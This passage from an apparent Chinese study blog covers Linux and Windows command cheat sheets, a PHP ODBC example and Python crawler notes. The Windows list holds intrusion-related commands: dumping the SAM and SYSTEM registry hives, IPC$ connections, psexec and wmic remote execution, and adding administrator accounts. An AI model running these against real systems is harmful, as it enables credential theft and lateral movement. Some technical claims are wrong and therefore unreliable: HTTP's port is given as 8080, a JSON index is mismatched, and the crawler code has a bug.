的区别】upgrade:系统将现有的Package升级,如果有相依性的问题,而此相依性需要安装其它新的Package或影响到其它Package的相依性时,此Package就不会被升级,会保留下来.dist-upgrade:如果有相依性问题,需要安装/移除新的Package,就会试着去安装/移除它.(所以通常这个会被认为是有点风险的升级)apt-get upgrade 和 apt-get dist-upgrade 本质上是没有什么不同的，只不过dist-upgrade会识别出当依赖关系改变的情形并作出处理，而upgrade对此情形不处理。例如软件包 a 原先依赖 b c d，但是在源里面可能已经升级了，现在是 a 依赖 b c e。这种情况下，dist-upgrade 会删除 d 安装 e，并把 a 软件包升级，而 upgrade 会认为依赖关系改变而拒绝升级 a软件包。--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--clear 清屏sudo gpedit 特权调用gpedit编辑器reboot 重启apt-get install XXXXX 安装缺少的依赖包，（XXX）里面输入缺少依赖包的名字apt-get autoremove –purge 软件名 删除包及其依赖的软件包+配置文件等apt-get install +模块名 这种方法也可以安装模块,或者apt-get install python-模块名firefox 浏览器打开shutdown -h now 关闭系统(1)init 0 关闭系统(2)telinit 0 关闭系统(3)shutdown -h hours:minutes &amp; 按预定时间关闭系统shutdown -c 取消按预定时间关闭系统shutdown -r now 重启(1)reboot 重启(2)su -l 切换登陆用户logout 注销用户登陆pwd 当前路径</code></pre><h3 id="2-文件夹或文本操作"><a href="#2-文件夹或文本操作" class="headerlink" title="2.文件夹或文本操作"></a>2.文件夹或文本操作</h3><pre><code>cd .. 返回上一级目录cd ../.. 返回上级两级目录cd - 返回上次所在的目录cd 文件夹名  进去文件夹cd ~ 进去当前用户主目录pwd 显示当前工作路径touch 文件名  常见文件cat 文件名 读取文档内容mkdir 文件名 创建文件夹mkdir -p 文件夹 递归创建文件夹cp 复制命令cp -r moon moons 复制moon 文件夹到当前 moons 如果有里面有文件 使用-r mv 移动命令mv moon moons 也可以说是改名mkdir 文件名 文件名 创建多个文件夹ls 显示文件和文件夹名ls -a 显示所有的文件和文件夹 包含隐藏文件ls -l 显示文件和目录的详细资料rm -f 文件  删除文件rm 文件夹名 删除文件夹rm -rf  文件/文件夹  删除文件夹 及其目录下的文件bzip2 file1 压缩一个叫做 ‘file1’ 的文件gunzip file1.gz 解压一个叫做 ‘file1.gz’的文件gzip file1 压缩一个叫做 ‘file1’的文件gzip -9 file1 最大程度压缩rar a file1.rar test_file 创建一个叫做 ‘file1.rar’ 的包rar x file1.rar 解压rar包unrar x file1.rar 解压rar包dpkg -i package.deb 安装/更新一个 deb 包dpkg -r package_name 从系统删除一个 deb 包dpkg -l 显示系统中所有已经安装的 deb 包dpkg -l | grep httpd 显示所有名称中包含 “httpd” 字样的deb包dpkg -s package_name 获得已经安装在系统中一个特殊包的信息dpkg -L package_name 显示系统中已经安装的一个deb包所提供的文件列表dpkg –contents package.deb 显示尚未安装的一个包所提供的文件列表tar zcvf +压缩文件名 压缩文件tar zxvf +解压包名 解压文件tar -jcvf renwolesshel.tar.bz2 打包tar jxvf renwolesshel.tar.bz2 解压zip -q -r renwolesshel.zip renwolesshel/ 解压zip格式的压缩包unzip renwolesshel.zipwhich 加软件名 可以查出软件目录在哪./+文件名或者apt-get +文件名 安装文件</code></pre><h3 id="3-系统信息"><a href="#3-系统信息" class="headerlink" title="3.系统信息"></a>3.系统信息</h3><pre><code>arch 显示机器的处理器架构(1)uname -m 显示机器的处理器架构(2)uname -r 显示正在使用的内核版本cat /proc/version 显示内核的版本cat /proc/net/dev 显示网络适配器及统计cat /proc/cpuinfo 显示CPU info的信息cat /proc/mounts 显示已加载的文件系统</code></pre><h3 id="4-vi-常用命令"><a href="#4-vi-常用命令" class="headerlink" title="4.vi 常用命令"></a>4.vi 常用命令</h3><p>vi编辑器分为三种状态，分别是：<br>1.命令模式（command mode）<br>控制屏幕光标的移动，字符、字或行的删除，移动复制某区段及进入Insert mode下，或者到 last line mode。<br>2.插入模式（Insert mode）<br>只有在Insert mode下，才可以做文字输入，按「ESC」键可回到命令行模式。<br>3.底行模式（last line mode）<br>将文件保存或退出vi，也可以设置编辑环境，如寻找字符串、列出行号……等。</p><pre><code>**打开**vi filename :打开或新建文件，并将光标置于第一行首vi +n filename ：打开文件，并将光标置于第n行首vi + filename ：打开文件，并将光标置于最后一行首**编辑**i 在当前位置生前插入I 在当前行首插入a 在当前位置后插入A 在当前行尾插入o 在当前行之后插入一行O 在当前行之前插入一行编辑结束，按Esc返回命令模式**基本查找**/text　　查找text，按n健查找下一个，按N健查找前一个。?text　　查找text，反向查找，按n健查找下一个，按N健查找前一个。查找很长的词，如果一个词很长，键入麻烦，可以将光标移动到该词上，按*或#键即可以该单词进行搜索，相当于/搜索。而#命令相当于?搜索。**删除**删除当前行 dd删除2行 2dd**拷贝和粘贴**yy 拷贝当前行nyy 拷贝当前后开始的n行，比如2yy拷贝当前行及其下一行。p  在当前光标后粘贴区块拷贝1. 将光标移动到要复制的文本开始的地方，按 v进入可视模式。2. 将光标移动到要复制的文本的结束的地方，按y复制。此时vim会自动将光标定位到选中文本的开始的地方，并退出可视模式。3. 我移动光标到文本结束的地方，按 p粘贴。**退出命令**:wq 保存并退出:q! 强制退出并忽略所有更改:e! 放弃所有修改，并打开原来文件:w保存修改**显示行号**set numberset nu输入:n，代表跳转到第n行，如:100，就跳转到第100行。撤销操作u——&gt; vim与vi的区别——&gt; vim是vi的延申 vim编辑源码会高亮 vim的命令对vi是完全兼容的</code></pre><h3 id="5-文件搜索"><a href="#5-文件搜索" class="headerlink" title="5.文件搜索"></a>5.文件搜索</h3><pre><code>find / -name file1 从 ‘/’ 开始进入根文件系统搜索文件和目录find / -user user1 搜索属于用户 ‘user1’ 的文件和目录find /home/user1 -name *.bin 在目录 ‘/ home/user1’ 中搜索带有’.bin’ 结尾的文件find /usr/bin -type f -atime +100 搜索在过去100天内未被使用过的执行文件find /usr/bin -type f -mtime -10 搜索在10天内被创建或者修改过的文件find . -name &#39;*.php&#39; -mmin -30  查找最近30分钟修改的当前目录下的.php文件find . -name &#39;*.php&#39; -mtime 0  查找最近24小时修改的当前目录下的.php文件find . -name &#39;*.inc&#39; -mtime 0 -ls  查找最近24小时修改的当前目录下的.php文件，并列出详细信息find . -type f -mtime 1  查找当前目录下，最近24-48小时修改过的常规文件。find . -type f -mtime +1  查找当前目录下，最近1天前修改过的常规文件。-atime 文件访问时间-ctime 文件常见时间-mtime文件修改时间-mtime n : n为数字，意思为在n天之前的“一天之内”被更改过内容的文件-mtime +n : 列出在n天之前（不含n天本身）被更改过内容的文件名-mtime -n : 列出在n天之内（含n天本身）被更改过内容的文件名-type f 代表一个普通格式的文件 二进制文件-type d 代表文件夹find / -name *.rpm -exec chmod 755 ‘&#123;&#125;’ ; 搜索以 ‘.rpm’ 结尾的文件并定义其权限--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--文件中r w x -的含义:r是只读权限，w是写的权限，x是可执行权限,-是没有任何权限。目录中r w x的含义:r具有ls权限，w是在目录上可以增加、删除、创建权限，x是具有ls –l权限。权限     读    写   执行        读    写   执行      读   写   执行字符     r     w     x           r     w    x         r    w    x数字     4     2     1           4     2    1         4    2    1分配     对象文件所有者          文件所属组用户         其他用户chmod 777 +文件名 给单独文件赋所有权限chmod -R 777 /home/user  表示将整个/home/user目录与其中的文件和子目录的权限都设置为rwxrwxrwx常用权限-rw------- (600) 只有所有者才有读和写的权限-rw-r--r-- (644) 只有所有者才有读和写的权限，组群和其他人只有读的权限-rwx------ (700) 只有所有者才有读，写，执行的权限-rwxr-xr-x (755) 只有所有者才有读，写，执行的权限，组群和其他人只有读和执行的权限-rwx--x--x (711) 只有所有者才有读，写，执行的权限，组群和其他人只有执行的权限-rw-rw-rw- (666) 每个人都有读写的权限-rwxrwxrwx (777) 每个人都有读写和执行的权限也可以使用字母模式chmod +x 和chmod a+x 是一样的，一般没有明确要求，可以就用chmod +xu代表用户   g代表用户组   o代表其它   a代表所有创建一个文件只有用户具有完全控制的权限touch 文件名chmod u+rwx 文件名 当前用户加全部的权限chmod g-r 文件名   群组把读取权限去掉chmod o-r 文件名   其他用户读取权限去掉--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--find / -xdev -name *.rpm 搜索以 ‘.rpm’ 结尾的文件，忽略光驱、捷盘等可移动设备locate *.ps 寻找以 ‘.ps’ 结尾的文件 - 先运行 ‘updatedb’ 命令whereis halt 显示一个二进制文件、源码或man的位置which halt 显示一个二进制文件或可执行文件的完整路径grep kali /etc/passwd grep关键词搜索find / -name moonsec 2&gt;/dev/null   搜索某个文件/文件夹 屏蔽出错信息</code></pre><h3 id="6-用户和群组"><a href="#6-用户和群组" class="headerlink" title="6.用户和群组"></a>6.用户和群组</h3><pre><code>groupadd group_name 创建一个新用户组groupdel group_name 删除一个用户组cat /etc/group | grep group_name usermod -a -G moontea k1把用户k1附加其他用户组useradd moonsecpasswd moonsecuseradd -r -m -s /bin/bash moonsec参数的意思：-r 建立系统账号-m 自动建立用户的登入目录-s /bin/bash 指定用户登入后所使用的shellsu - root 切换到root用户su 用户名 切换到普通用户</code></pre><h3 id="7-系统管理"><a href="#7-系统管理" class="headerlink" title="7.系统管理"></a>7.系统管理</h3><pre><code>top  查看正在指向的程序信息ps -ef 查看所有进程信息ps -ef | grep tomcat 查找指定进程kill -9 id 强制杀死进程env 当前的变量查看系统变量echo $PATHhostname 查看主机名history 查看历史命令</code></pre><h3 id="8-查看磁盘信息"><a href="#8-查看磁盘信息" class="headerlink" title="8.查看磁盘信息"></a>8.查看磁盘信息</h3><pre><code>df   默认不带单位，挂载点、总容量、已用、可用df  -h   友好显示（带单位），很多命令的友好显示都是-h</code></pre><h3 id="9-查看内存信息"><a href="#9-查看内存信息" class="headerlink" title="9.查看内存信息"></a>9.查看内存信息</h3><pre><code>free   默认以KB为单位，总容量、已用、可用、缓存大小free  -m   默认以MB为单位free  -h   上面2种都不带单位、只显示数值，这种是友好显示的，会带单位G、M等</code></pre><h3 id="10-查看环境变量"><a href="#10-查看环境变量" class="headerlink" title="10.查看环境变量"></a>10.查看环境变量</h3><pre><code>echo  $JAVA_HOMEecho $PATH | grep jdk</code></pre><h3 id="11-开机自启"><a href="#11-开机自启" class="headerlink" title="11.开机自启"></a>11.开机自启</h3><p>有很多程序往往都需要设置开机自启，比如tomcat、mysql、nginx等。</p><pre><code>vim /etc/rc.d/rc.local   在/etc/rc.d/rc.local文件中加入开机要自动执行的程序mount -t smbfs -o username=user,password=pass //WinClient/share /mnt/share   挂载一个windows网络共享</code></pre><h3 id="12-网卡配置"><a href="#12-网卡配置" class="headerlink" title="12.网卡配置"></a>12.网卡配置</h3><pre><code>vi /etc/network/interfacesauto eth0                     //指定网卡（根据ifconfig结果修改）iface eth0 inet static        //启动静态ipaddress 192.168.0.66          // 设置静态ipnetmask 255.255.255.0         //子网掩码gateway 192.168.0.1           //指定网关service networking restart    //重启网络systemctl restart networking  //重启网络ifconfig eth0 192.168.0.33    //设置临时ip</code></pre><h3 id="13网卡DNS服务器"><a href="#13网卡DNS服务器" class="headerlink" title="13网卡DNS服务器"></a>13网卡DNS服务器</h3><pre><code>vi /etc/resovl.confnameserver 114.114.114.114重启网卡service networking restartsystemctl restart networking注意有时候重启才生效</code></pre><h3 id="14-服务相关"><a href="#14-服务相关" class="headerlink" title="14.服务相关"></a>14.服务相关</h3><pre><code>apache2服务器打开：/etc/init.d/apache2 start 重启：/etc/init.d/apache2 restart关闭：/etc/init.d/apache2 stop/etc/init.d/network start  启动网卡echo 1 &gt; /proc/sys/net/ipv4/ip_forward  开启路由转发</code></pre><h3 id="15-linux常用网络命令"><a href="#15-linux常用网络命令" class="headerlink" title="15.linux常用网络命令"></a>15.linux常用网络命令</h3><p>网络和监控命令类似于这些： hostname, ping, ifconfig, iwconfig, netstat, nslookup, traceroute, finger, telnet, ethtool<br>用于查看 linux 服务器 ip 地址，管理服务器网络配置，通过 telnet 和 ethernet 建立与 linux 之间的网络链接，查看 linux 的服务器信息等。</p><pre><code>hostname 查看本机名ping  一般用于测试网络是否通 内网icmpping www.baidu.com -c 3 执行3次ifconfig 网卡信息iwconfig 用于配置或获取无线网络设备信息netstat -a (all)显示所有选项，默认不显示LISTEN相关-t (tcp)仅显示tcp相关选项-u (udp)仅显示udp相关选项-n 拒绝显示别名，能显示数字的全部转化成数字。-l 仅列出有在 Listen (监听) 的服務状态-p 显示建立相关链接的程序名-r 显示路由信息，路由表-e 显示扩展信息，例如uid等-s 按各个协议进行统计-c 每隔一个固定时间，执行该netstat命令。提示：LISTEN和LISTENING的状态只有用-a或者-l才能看到netstat -ano-an 查看当前所有已连接端口-nlpt 查看当前所有tcp端口-nlpu 查看当前所有udp端口-nlpt | grep 80 查看所有80端口使用情况netstat -lntup 查看所有的tcp和upd端口nslookup 查询其他记录直接查询返回的是A记录，我们可以指定参数，查询其他记录，比如AAAA、MX等。nslookup -qt=type domain [dns-server]其中，type可以是以下这些类型：A 地址记录AAAA 地址记录AFSDB Andrew文件系统数据库服务器记录ATMA ATM地址记录CNAME 别名记录HINFO 硬件配置记录，包括CPU、操作系统信息ISDN 域名对应的ISDN号码MB 存放指定邮箱的服务器MG 邮件组记录MINFO 邮件组和邮箱的信息记录MR 改名的邮箱记录MX 邮件服务器记录NS 名字服务器记录PTR 反向记录RP 负责人记录RT 路由穿透记录SRV TCP服务器信息记录TXT 域名对应的文本信息X25 域名对应的X.25地址记录traceroute-d 使用Socket层级的排错功能。-f 设置第一个检测数据包的存活数值TTL的大小。-F 设置勿离断位。-g 设置来源路由网关，最多可设置8个。-i 使用指定的网络界面送出数据包。-I 使用ICMP回应取代UDP资料信息。-m 设置检测数据包的最大存活数值TTL的大小。-n 直接使用IP地址而非主机名称。-p 设置UDP传输协议的通信端口。-r 忽略普通的Routing Table，直接将数据包送到远端主机上。-s 设置本地主机送出数据包的IP地址。-t 设置检测数据包的TOS数值。-v 详细显示指令的执行过程。-w 设置等待远端主机回报的时间。-x 开启或关闭数据包的正确性检验。(traceroute是用来检测发出数据包的主机到目标主机之间所经过的网关数量的工具。)(traceroute的原理是试图以最小的TTL（存活时间）发出探测包来跟踪数据包到达目标主机所经过的网关，然后监听一个来自网关ICMP的应答。发送数据包的大小默认为38个字节。)telnetLinux telnet命令用于远端登入。执行telnet指令开启终端机阶段作业，并登入远端主机。现在多数用于检测某个端口是否开放FingerFinger是一种用户信息分享服务。它工作在TCP 79端口，可以用来公开用户的特定信息。Nmap的finger的脚本可以向Finger服务器发送请求，查询并获取用户的相关信息，如登录名、用户名、TTY类型、登录时间等。ethtool 是用于查询及设置网卡参数的命令</code></pre><h3 id="16-防火墙iptables"><a href="#16-防火墙iptables" class="headerlink" title="16.防火墙iptables"></a>16.防火墙iptables</h3><pre><code>iptalbes -L  查看防火墙规则iptables -F   清除规则/etc/init.d/iptables stop   关闭防火墙service iptables stop安装：apt-get install ufw关闭：ufw disable # To disable the firewall开启：ufw enable # To enable the firewall</code></pre>]]></content>
      
      
      <categories>
          
          <category> 附录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 附录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows常用命令</title>
      <link href="/2022/11/20/Windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2022/11/20/Windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h3 id="Windows常用命令"><a href="#Windows常用命令" class="headerlink" title="Windows常用命令"></a>Windows常用命令</h3><pre><code>ifconfig /all 获取获取域名、IP地址、DHCP服务器、网关、MAC地址、主机名net time /domain 查看域名、时间net view /domain 查看域内所有共享net view ip 查看对方局域网内开启了哪些共享net config workstation 查看域名、机器名等net user 用户名 密码 /add 建立用户net user 用户名 /del #删除用户net user guest /active:yes 激活guest账户net user 查看账户net user 账户名 查看指定账户信息net user /domain 查看域内有哪些用户，Windows NT Workstation 计算机上可用，由此可以此判断用户是否是域成员。net user 用户名 /domain 查看账户信息net group /domain 查看域中的组net group &quot;domain admins&quot; /domain 查看当前域的管理用户query user 查看当前在线的用户net localgroup 查看所有的本地组net localgroup administrators 查看administrators组中有哪些用户net localgroup administrators 用户名 /add 把用户添加到管理员组中net start 查看开启服务net start 服务名 开启某服务net stop 服务名 停止某服务net share 查看本地开启的共享net share ipc$ 开启ipc$共享net share ipc$ /del 删除ipc$共享net share c$ /del 删除C：共享\\192.168.0.108\c 访问默认共享c盘dsquery server 查看所有域控制器dsquery subnet 查看域内内子网dsquery group 查看域内工作组dsquery site 查看域内站点netstat -a 查看开启了哪些端口,常用netstat -annetstat -n 查看端口的网络连接情况，常用netstat -annetstat -v 查看正在进行的工作netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况（查看tcp/ip协议使用情况）netstat -s 查看正在使用的所有协议使用情况nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写reg save hklm\sam sam.hive 导出用户组信息、权限配置reg save hklm\system system.hive 导出SYSKEYnet use \\目标IP\ipc$ 密码 /u:用户名 连接目标机器at \\目标IP 21:31 c:\server.exe 在某个时间启动某个应用wmic /node:&quot;目标IP&quot; /password:&quot;123456&quot; /user:&quot;admin&quot; 连接目标机器psexec.exe \\目标IP -u username -p password -s cmd 在目标机器上执行cmdfinger username @host 查看最近有哪些用户登陆route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interfacearp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a 将显示出全部信息nslookup IP地址侦测器tasklist 查看当前进程taskkill /pid PID数 终止指定PID进程whoami 查看当前用户及权限systeminfo 查看计算机信息（版本，位数，补丁情况）ver 查看计算机操作系统版本tasklist /svc 查看当前计算机进程情况netstat -ano 查看当前计算机进程情况wmic product &gt; ins.txt 查看安装软件以及版本路径等信息，重定向到ins.txt</code></pre>]]></content>
      
      
      <categories>
          
          <category> 附录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 附录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ODBC数据库</title>
      <link href="/2022/11/19/ODBC%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
      <url>/2022/11/19/ODBC%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h5 id="此章节是拓展阅读，选择性食用"><a href="#此章节是拓展阅读，选择性食用" class="headerlink" title="此章节是拓展阅读，选择性食用"></a>此章节是拓展阅读，选择性食用</h5><p>概念:ODBC 是一种应用程序编程接口(API)，使我们有能力连接到某个数据源。</p><h4 id="创建-ODBC-连接"><a href="#创建-ODBC-连接" class="headerlink" title="创建 ODBC 连接"></a>创建 ODBC 连接</h4><p>通过一个 ODBC 连接，可以连接到网络中的任何计算机上的任何数据库。<br>创建到达 MS Access 数据库的 ODBC 连接的方法:<br>1.在控制面板中打开管理工具图标。<br>2.双击其中的数据源(ODBC)图标。<br>3.选择系统 DSN 选项卡。<br>4.点击系统 DSN 选项卡中的添加。<br>5.选择Microsoft Access Driver。点击完成。<br>6.在下一个界面，点击选择来定位数据库。<br>7.为数据库起一个数据源名(DSN)。<br>8.点击确定。</p><p>注意:必须在您的网站所在的计算机上完成这个配置。<br>如果您的计算机上正在运行 Internet 信息服务(IIS)，上面的指令将会生效。<br>但是如果您的网站位于远程服务器，您必须拥有对该服务器的物理访问权限，或者请您的主机提供商为您建立 DSN。</p><h4 id="连接-ODBC"><a href="#连接-ODBC" class="headerlink" title="连接 ODBC"></a>连接 ODBC</h4><pre><code>实例下面的实例创建了到达名为 link 的 DSN 的连接，没有用户名和密码。然后创建并执行一条 SQL 语句：$conn=odbc_connect(&#39;link&#39;,&#39;&#39;,&#39;&#39;);           //数据源名、用户名、密码以及可选的指针类型$sql=&quot;SELECT * FROM customers&quot;;$rs=odbc_exec($conn,$sql);                  //执行 SQL 语句</code></pre><h4 id="取回记录"><a href="#取回记录" class="headerlink" title="取回记录"></a>取回记录</h4><p>从结果集中返回记录。如果能够返回行，则函数返回 true，否则返回 false。</p><pre><code>该函数有两个参数：ODBC 结果标识符和可选的行号:odbc_fetch_row ( resource $result_id [, int $row_number = 1 ] )</code></pre><h4 id="从记录中取回字段"><a href="#从记录中取回字段" class="headerlink" title="从记录中取回字段"></a>从记录中取回字段</h4><p>从记录中读取字段。该函数有两个参数:ODBC 结果标识符和字段编号或名称。</p><pre><code>$compname=odbc_result($rs,1);                             //从记录中返回第一个字段的值$compname=odbc_result($rs,&quot;CompanyName&quot;);                 //返回名为 &quot;CompanyName&quot; 的字段的值</code></pre><h4 id="关闭-ODBC-连接"><a href="#关闭-ODBC-连接" class="headerlink" title="关闭 ODBC 连接"></a>关闭 ODBC 连接</h4><p> odbc_close($conn); </p><h4 id="全过程示例"><a href="#全过程示例" class="headerlink" title="全过程示例"></a>全过程示例</h4><pre><code> &lt;?php $conn=odbc_connect(&#39;northwind&#39;,&#39;&#39;,&#39;&#39;);            //连接 ODBC if (!$conn)                                       //验证链接 &#123;exit(&quot;Connection Failed: &quot; . $conn);&#125;            //失败的回显 $sql=&quot;SELECT * FROM customers&quot;;                   //创建链接 $rs=odbc_exec($conn,$sql);                        //执行 SQL 语句 if (!$rs) &#123;exit(&quot;Error in SQL&quot;);&#125;                           //判断是否连接正常 echo &quot;&lt;table&gt;&lt;tr&gt;&quot;; echo &quot;&lt;th&gt;Companyname&lt;/th&gt;&quot;;                      //回显 echo &quot;&lt;th&gt;Contactname&lt;/th&gt;&lt;/tr&gt;&quot;; while (odbc_fetch_row($rs))                       //取回记录 &#123; $compname=odbc_result($rs,&quot;CompanyName&quot;);         //从记录中取回字段compname $conname=odbc_result($rs,&quot;ContactName&quot;);          //从记录中取回字段compname echo &quot;&lt;tr&gt;&lt;td&gt;$compname&lt;/td&gt;&quot;;  echo &quot;&lt;td&gt;$conname&lt;/td&gt;&lt;/tr&gt;&quot;; &#125; odbc_close($conn);                                //关闭 ODBC 连接 echo &quot;&lt;/table&gt;&quot;; ?&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 附录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 附录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于面向对象的Python爬虫</title>
      <link href="/2022/11/19/20221119/"/>
      <url>/2022/11/19/20221119/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="基于面向对象的Python爬虫"><a href="#基于面向对象的Python爬虫" class="headerlink" title="基于面向对象的Python爬虫"></a>基于面向对象的Python爬虫</h4><pre><code>import urllib.requestimport reclass GetHtml(object):    def __init__(self,URL,HEAD):      //初始化        self.url=URL        self.head=HEAD        def get_index(self):              //获取主页信息        self.request=urllib.request.Request(self.url)        self.request.add_header(&#39;user-agent&#39;,self.request)        self.response=urllib.request.urlopen(self.request)        return self.response.read()        def get_list(self):               //获取符合条件的列表        self.strimglist=[]        self.imglist=re.findall(b&#39;匹配条件&#39;,self.get_index())        for i in self.imglist:            self.strimglist.append(self.url+str(i,encoding=&#39;utf8&#39;))        return self.strimglist        def get_image(self):              //下载资源        num=0        for self.url in self.get_list():            num+=1            with open(str(num)+&#39;后缀&#39;,&#39;wb&#39;) as file:                file.write(self.get_index())html=GetHtml(&#39;目标地址&#39;,&#39;请求头&#39;)html.get_list()</code></pre><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="有阳光、还感觉冷。如果我忍住这个秘密、温暖冬天就会遥遥而无期。"><a href="#有阳光、还感觉冷。如果我忍住这个秘密、温暖冬天就会遥遥而无期。" class="headerlink" title="有阳光、还感觉冷。如果我忍住这个秘密、温暖冬天就会遥遥而无期。"></a>有阳光、还感觉冷。如果我忍住这个秘密、温暖冬天就会遥遥而无期。</h5>]]></content>
      
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面向对象</title>
      <link href="/2022/11/18/20221118/"/>
      <url>/2022/11/18/20221118/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="面向对象编程"><a href="#面向对象编程" class="headerlink" title="面向对象编程"></a>面向对象编程</h4><p>类:设计<br>对象:实例</p><h4 id="类的命名"><a href="#类的命名" class="headerlink" title="类的命名"></a>类的命名</h4><p>驼峰命名法</p><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><pre><code>class 类名:    属性(变量) = 值    def 函数名(self):         //方法(函数),一定要写self        执行代码对象名=类名()                 //创建对象对象名.函数()                 //调用对象</code></pre><h4 id="魔法方法"><a href="#魔法方法" class="headerlink" title="魔法方法"></a>魔法方法</h4><p>通常格式为__方法名__</p><pre><code>def __init__(self,值):    self.属性=值如果值也是一个变量就能随时传参进行更改</code></pre><h4 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h4><p>1.定义类class<br>2.创建内存空间,定义属性和方法<br>3.实例化类,创建对象<br>4.调用类的方法</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="风吹落最后一片叶，"><a href="#风吹落最后一片叶，" class="headerlink" title="风吹落最后一片叶，"></a>风吹落最后一片叶，</h5><h5 id="我的心也飘着雪，"><a href="#我的心也飘着雪，" class="headerlink" title="我的心也飘着雪，"></a>我的心也飘着雪，</h5><h5 id="爱只能往回忆里堆叠。"><a href="#爱只能往回忆里堆叠。" class="headerlink" title="爱只能往回忆里堆叠。"></a>爱只能往回忆里堆叠。</h5>]]></content>
      
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python爬虫一篇就够了</title>
      <link href="/2022/11/17/20221117/"/>
      <url>/2022/11/17/20221117/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="Python爬虫思路"><a href="#Python爬虫思路" class="headerlink" title="Python爬虫思路"></a>Python爬虫思路</h4><p>1.发送请求获取网站html代码<br>2.过滤有效信息<br>3.解析数据<br>4.处理数据</p><h4 id="爬取过程"><a href="#爬取过程" class="headerlink" title="爬取过程"></a>爬取过程</h4><p>1.找到网站发起请求<br>2.分析url并提取<br>3.分析url并解释网络内容<br>4.存储数据并获取新url<br>5.判断是否满足停止条件0</p><h4 id="robots协议"><a href="#robots协议" class="headerlink" title="robots协议"></a>robots协议</h4><p>决定可以访问的user(允许爬取的user)</p><h4 id="http与https"><a href="#http与https" class="headerlink" title="http与https"></a>http与https</h4><p>http端口是8080<br>https加密,SSL层,端口是443</p><h4 id="URL与URI"><a href="#URL与URI" class="headerlink" title="URL与URI"></a>URL与URI</h4><p>url包括协议类型，主机名/域名，端口号，查找路径，查找参数，锚点<br>uri是utl请求之前部分</p><h4 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h4><p>get不影响资源/post影响资源</p><h4 id="请求头参数"><a href="#请求头参数" class="headerlink" title="请求头参数"></a>请求头参数</h4><p>user-agent:浏览器名称<br>referer:请求源头<br>cookie:用于判断用户身份</p><h4 id="常见响应状态码"><a href="#常见响应状态码" class="headerlink" title="常见响应状态码"></a>常见响应状态码</h4><p>200:正常返回<br>301:永久重定向<br>404:url错误<br>418:反爬虫，解决响应<br>500:服务器错误，bug</p><h4 id="请求交互过程"><a href="#请求交互过程" class="headerlink" title="请求交互过程"></a>请求交互过程</h4><p>1.客户端浏览器向服务器发送请求<br>2.网站接收请求处理后返回响应数据<br>3.浏览器解析源码</p><h4 id="开发者工具"><a href="#开发者工具" class="headerlink" title="开发者工具"></a>开发者工具</h4><p>element:分析网页结构，获取数据<br>console:打印输出网站信息<br>network:查看网络请求<br>source:所有的源文件(只能查看静态数据)</p><h4 id="Session与Cookie原理"><a href="#Session与Cookie原理" class="headerlink" title="Session与Cookie原理"></a>Session与Cookie原理</h4><p>【Session】<br>特点:可长时间保存会话<br>过程:<br>1.客户端第一次发送请求时服务器端创建Session对象(生成sessionID)<br>2.将sessionID存入cookie传回<br>3.下次发送请求时包含sessionID<br>【Cookie】<br>特点:从服务器发送给浏览器后一直保存到关闭浏览器<br>过程:<br>1.创建cookie<br>2.设置存储cookie<br>3.发送cookie<br>4.读取cookie</p><h4 id="JSON-数据交换语言"><a href="#JSON-数据交换语言" class="headerlink" title="JSON(数据交换语言)"></a>JSON(数据交换语言)</h4><p>JavaScript ObjectNotation，JS对象标记<br>数据格式:<br>1.对象表示为键值对<br>2.数据用逗号分隔<br>3.花括号保存对象<br>4.方括号保存数组<br>整体上与python的字典相似<br>例:</p><pre><code>json_yuju=&#123;&#39;name&#39;:&#39;python&#39;,&#39;address&#39;:&#123;&#39;province&#39;:&#39;guangdong&#39;,&#39;city&#39;:[&#39;guangzhou&#39;,&#39;huizhou&#39;]&#125;&#125;print(json_yuju[&#39;address&#39;][&#39;city&#39;][2])               //输出huizhou</code></pre><h4 id="Ajax-Web数据交互方式"><a href="#Ajax-Web数据交互方式" class="headerlink" title="Ajax(Web数据交互方式)"></a>Ajax(Web数据交互方式)</h4><p>Ajax在服务器与浏览器之间使用异步数据传输(可以只请求少量信息)<br>Ajax技术独立于浏览器与平台<br>Ajax一般返回JSON(对Ajax地址进行post或get就可以返回JSON数据)<br>Ajax渲染到html的叫做动态数据<br>服务器后台生成的是静态数据<br>html中的在source中没有找到那就是ajax<br>注意:Ajax需要用户允许JavaScript在浏览器上执行</p><h4 id="urllib"><a href="#urllib" class="headerlink" 